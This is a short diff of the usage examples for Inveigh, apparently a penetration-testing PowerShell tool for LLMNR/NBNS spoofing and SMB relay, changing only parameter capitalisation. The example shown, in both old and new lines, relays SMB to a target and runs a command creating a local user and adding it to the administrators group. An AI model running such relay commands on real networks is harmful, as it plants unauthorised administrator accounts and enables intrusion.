@@ -106,7 +106,7 @@ Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
 Execute specifying a specific local listening IP and a LLMNR/NBNS spoofing IP on another subnet. This may be useful for sending traffic to a controlled Linux system on another subnet.
 
 .EXAMPLE
-Invoke-Inveigh -smbrelay y -smbrelaytarget 192.168.2.55 -smbrelaycommand "net user Dave Summer2015 /add && net localgroup administrators Dave /add"
+Invoke-Inveigh -SMBRelay y -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Summer2015 /add && net localgroup administrators Dave /add"
 Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay target.  
 
 .EXAMPLE
